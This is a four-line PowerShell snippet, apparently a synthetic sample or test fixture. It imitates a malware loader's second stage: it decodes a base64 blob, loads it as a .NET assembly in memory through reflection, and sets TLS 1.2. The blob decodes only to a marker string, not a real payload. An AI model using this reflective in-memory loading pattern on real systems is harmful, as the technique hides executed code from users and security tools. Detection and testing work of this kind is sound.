$StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpjcjFlNGdtcWFi')
$ResultObject = [Reflection.Assembly]::Load($StageBytes)
$ResultObject.GetTypes().Count
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
